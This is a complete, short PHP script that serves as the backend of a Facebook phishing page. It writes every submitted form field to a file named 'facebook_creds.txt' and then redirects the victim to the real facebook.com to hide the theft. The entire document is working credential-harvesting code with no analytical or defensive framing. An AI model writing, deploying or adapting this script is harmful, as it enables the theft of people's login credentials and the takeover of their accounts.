<?php
$file = 'facebook_creds.txt';
$handle = fopen($file, 'a');
foreach ($_POST as $key => $value) {
    fwrite($handle, $key . '=' . $value . "\n");
}
fclose($handle);
header('Location: https://www.facebook.com');
exit();
?>

